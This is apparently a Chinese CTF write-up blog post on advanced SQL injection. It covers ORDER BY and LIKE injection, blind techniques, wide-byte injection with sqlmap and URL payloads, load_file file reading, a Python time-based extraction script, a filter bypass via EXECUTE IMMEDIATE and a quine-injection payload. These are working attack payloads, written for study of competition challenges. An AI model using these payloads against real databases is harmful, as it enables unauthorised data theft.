---
title: SQL注入进阶——特殊位置及类型的注入
date: 2026-07-24 17:46:40
tags:
---

SQL注入应该是我接触比较早的一个漏洞，这里总结一下比赛中的进阶技巧。

# 特殊位置

初学的时候的SQL注入一般都是拼接在where后面的

```SQL
select username from users where id=0 union select password from users
```

但是在实战的很多时候会出现在其他位置上，这就需要进行一些特殊的闭合甚至是盲注

## LIKE

```SQL
SELECT * FROM articles WHERE title LIKE '%$kw%';
```

或者

```SQL
SELECT * FROM articles WHERE title LIKE ('%$kw%');
```

一般出现在一些搜索的场景下，通常一个关键字可以查询出好几条数据。

## ORDER BY

```SQL
SELECT 字段 FROM 表 WHERE 条件 ORDER BY [你传入的参数] LIMIT 1;
```

在ORDER BY后面通常无法进行union拼接，因为`ORDER BY` 在单句查询的末尾。但攻击者可以利用 `CASE WHEN` 条件表达式 或 `IF()` 函数来进行盲注。

### 布尔盲注

```sql
SELECT id, username, age FROM users 
ORDER BY (CASE WHEN (ASCII(SUBSTRING((SELECT password FROM admin LIMIT 1), 1, 1)) > 80) THEN id ELSE username END);
```

原理分析：

1. `CASE WHEN` 内部执行了一个子查询，获取管理员密码的第 1 个字符，并判断其 ASCII 码是否大于 80。
2. 如果为真：语句变成 `ORDER BY id`，返回的数据列表按 `id` 排序。
3. 如果为假：语句变成 `ORDER BY username`，返回的数据列表按 `username` 排序。
4. 只需对比页面返回数据的顺序是否变化，就能逐个字节推算出数据库里的敏感数据。

### 时间盲注

```SQL
SELECT id, username, age FROM users ORDER BY IF(1=1, SLEEP(3), id);
```

### [ISCTF2025]kaqiWeaponShop







# 特殊类型

也是当时没有学习不够深入的缘故，遗漏了一些注入类型

## 宽字节注入

知识方面不过多赘述，可以参考这篇文章

[深入浅出带你学习宽字节注入](https://juejin.cn/post/7167647367246643208)

### [LitCTF2026]lit_ezsql

一个SQL注入，正常查询的话id=1或id=2能查询出数据，下面我们测试一下闭合

```text
1 and 1=2 #
1'
1"
1')
1")
```

常见的几种组合都没有报错，并且能正常返回查询的数据，下面测试一些特殊的组合

```text
2abc
2e0
2-1
```

这些都返回了id=2的数据，说明对传进去的参数进行了处理，下面我们尝试一下宽字节注入

用sqlmap指定宽字节注入就能注出来

```text
sqlmap -u "http://challenge.cyclens.tech:31302/query?id=1" -D ezsql -T flag_store -C flag --dump --tamper=unmagicquotes --delay=0.5
```

![image-20260523201920975](https://gitee.com/bobrocket/img/raw/master/image-20260523201920975.png)

下面介绍一下手注的流程

测试 payload：

```bash
http://challenge.cyclens.tech:32035/query?id=1%bf%27%20OR%201=1--+
```

其中：

- `%bf` 是宽字节前导
- `%27` 是单引号 `'`
- 后面拼接 `OR 1=1--+`

返回结果中同时出现了两条记录，这就说明注入成功了，下面就是union拼接依次查库查表查字段查flag了

```text
/query?id=-1%bf%27%20UNION%20SELECT%201,database(),3,4,5--+
/query?id=-1%bf%27%20UNION%20SELECT%201,group_concat(table_name),3,4,5%20FROM%20information_schema.tables%20WHERE%20table_schema=database()--+
/query?id=-1%bf%27%20UNION%20SELECT%201,2,3,4,group_concat(flag)%20FROM%20flag_store--+
```

## 读文件

```SQL
id=15 union select 2,4,5,6,7,8,9,1,2,3,4,5,load_file('/home/lixiaoxiao/passwd.txt'),1,2
```



# 语句执行

有些SQL题会直接让你执行SQL语句并设置一些WAF

## [BaseCTF2024]only one sql

### 官方wp

可以看到部分关键词已经被禁用，只能执行一句sql语句

其中select被禁用，无法通过常规查询来查询flag的值

首先使用`show tables`查询所有表，可以看到flag表

![img](https://j0zr0js7k7j.feishu.cn/space/api/box/stream/download/asynccode/?code=NDY3ZDk3MTM3MTNlZjlkZjMxN2UwYTRkMmNkZDM5ZDVfbkh2UHNKMklUNmw1cjI3U2lVY0lCMFJSeTdhSjRCZ3lfVG9rZW46QXRDNmJmTHZ3b2d6Rll4ODNBRGNiWmZRbjJjXzE3ODQ5MDc4NTk6MTc4NDkxMTQ1OV9WNA&add_watermark=true&scene_type=CCM)

使用`show columns from flag`查询flag表的所有字段

![img](https://j0zr0js7k7j.feishu.cn/space/api/box/stream/download/asynccode/?code=NWIyNzA5MzE5NTBkNDI1OWJiZmVlZGY0ODVhNWNiZjlfSDNvYU5Na3dPSENqNE11cjllcnlFbzEwaDNhcnB4QWNfVG9rZW46Q3hoaWJFNGVZb0lIbkt4cktKM2NHVWFsbk1mXzE3ODQ5MDc4NTk6MTc4NDkxMTQ1OV9WNA&add_watermark=true&scene_type=CCM)

可以看到id和data两个字段，猜测flag在data字段

接下来是基于时间的sql注入过程

使用语句`delete from flag where data like 'f%' and sleep(5)`来进行注入，如果like成功匹配到，and字段会对后面的语句进行处理，如果like匹配不到（返回false）and后语句则不会进行处理，因为sleep()函数返回值为null，因此整个where的判断永假

最后编写脚本来进行查询

```Python
import requests
import string

sqlstr = string.ascii_lowercase + string.digits + '-' + "{}"
url = "http://your.website/?sql=delete%20from%20flag%20where%20data%20like%20%27"
end="%25%27%20and%20sleep(5)"
flag=''
for i in range(1, 100):
    for c in sqlstr:
        payload = url +flag+ c + end
        try:
            r = requests.get(payload,timeout=4)
        except:
            print(flag+c)
            flag+=c
            break
```

### 非预期

不得不说AI还是太强了，最初只是想来测试一下AI的性能结果直接整出来一个非预期

最终 Payload：

```SQL
EXECUTE IMMEDIATE CONCAT(CHAR(83,69,76,69,67,84),CHAR(32),CHAR(100,97,116,97),CHAR(32),CHAR(70,82,79,77),CHAR(32),CHAR(99,116,102,46,102,108,97,103))-- 
```

即：`EXECUTE IMMEDIATE 'SELECT data FROM ctf.flag'`

## [0CTF]ezqueen

这个题确实难想，payload也很难构造，我只能照着wp分析一下思路

```php
<?php

$host = getenv('DB_HOST') ?: 'mysql';
$db   = getenv('DB_NAME') ?: 'app';
$user = getenv('DB_USER') ?: 'appuser';
$pass = getenv('DB_PASS') ?: 'apppass';

$con = @mysqli_connect($host, $user, $pass, $db);
if (!$con) die("DB connect error"); //连接数据库

function checkSql($s) {
    if(preg_match("/sleep|benchmark|lock|recursive|regexp|rlike|file|eval|update|schema|sys|substr|mid|left|right|replace|concat|insert|export_set|pad|@/i",$s)){ //过滤
        die("hacker!");
    }
}

$pwd=$_POST['pwd'] ?? '';
  
if ($pwd !== '') {
    if (strlen($pwd) > 200) die("too long!");
    checkSql($pwd);
    $sql="SELECT pwd FROM users WHERE username='admin' and pwd='$pwd';"; //用用户名和密码去查询pwd
    try {
        $user_result=mysqli_query($con,$sql);
        $row = mysqli_fetch_array($user_result);
        if (!$row) die("wrong password");
        if ($row['pwd'] === $pwd) { //查询到的pwd和输入必须一致
            die(getenv('FLAG'));
        }
        die("wrong password");
    } catch (Throwable $e) {
        die("wrong password");
    }
}
else {
    highlight_file(__FILE__);
}
```

我们先来了解一下常规的quine注入

[quine注入学习-先知社区](https://xz.aliyun.com/news/17210)

但是在这个题里面replace和@a都被ban了

### 解决方法

#### make_set(bits, str1, str2...)

make_set函数返回一个字符串，根据bits来选取后面的字符串参数，如果某一位是1，就选中对应的字符串

比如SELECT make_set(5, 'a', 'b', 'c', 'd');

5转换成二进制是0101，从右向左是1,0,1,0，因此a和c会被选中，然后用逗号连接并输出'a,c'

#### quote(str)

quote会返回被单引号包裹的字符串并且能自动转义里面的特殊字符

quote('hello')	输出'hello'

quote("it's test")	输出'it\'s a test'

#### 派生表与列别名

可以用下面的方法代替@a:

```sql
SELECT s FROM (SELECT 'test string' AS s) AS t;
-- 或者在MYSQL8.0+中
SELECT s FROM (SELECT 0, 'test string', 0) t(x, s, y);
```

这里会创建一个临时表t，里面有一列叫s，值是test string。然后可以用s来引用这个值

比较新的这个写法是一个语法糖

(SELECT 0, 'test string', 0)：产生一行数据，有三列

t(x, s, y)：把这个临时表命名为t，第一二三列名分别对应x(0)、s('test string')、y(0)

### Payload构造

上面三个方法有什么用，怎么用？

make_set可以让select输出我们想要的东西，派生表是实现自己等于自己的关键一步（它定义了s）并且语法特性可以抵消make_set产生的逗号，那么临时表会再次使用主体内容，quote就可解决这部分的单引号问题

最终payload

```
'/*,*/ union select make_set(15,0x272f2a,s,quote(s),0x30297428782c732c792923)from(select 0,'*/ union select make_set(15,0x272f2a,s,quote(s),0x30297428782c732c792923)from(select 0',0)t(x,s,y)#
```

整个sql语句大致如下

```sql
SELECT pwd
FROM users
WHERE username='admin' and pwd=''
/*,*/
union select make_set(15,0x272f2a,s,quote(s),0x30297428782c732c792923)
from (
  select 0,
         '*/ union select make_set(15,0x272f2a,s,quote(s),0x30297428782c732c792923)from(select 0',
         0
) t(x,s,y)
#';
```

我们把make_set里面的四部分拆开分析

0x272f2a就是`'/*`，那么为什么要有`'/*,*/`这一部分？

如果前面用来闭合命令的单引号变成了主体s的一部分，在后面会混淆，不便于操作，中间的逗号正是迎合make_set的特性

s就是后面派生表中的内容`*/ union select make_set(15,0x272f2a,s,quote(s),0x30297428782c732c792923)from(select 0`

下面的`quote(s)`就是重复一下派生表中的字符串，并且加上单引号

`0x30297428782c732c792923`就是最后面的`0) t(x,s,y)`

如此一来注释中间的逗号和派生表中间的两个逗号正好解决了make_set的问题



# 参考文献

[2025 0CTF-ezqueen-wp-先知社区](https://xz.aliyun.com/news/91068)

[‍‬‬‬‌‍‬‍﻿⁠‌⁠‍‌‌﻿⁠‬‍﻿﻿‬‌‍‌‍﻿‍﻿‬﻿﻿﻿BaseCTF 2024 官方 Writeup 合集 - 飞书云文档](https://j0zr0js7k7j.feishu.cn/docx/MS06dyLGRoHBfzxGPF1cz0VhnGh)
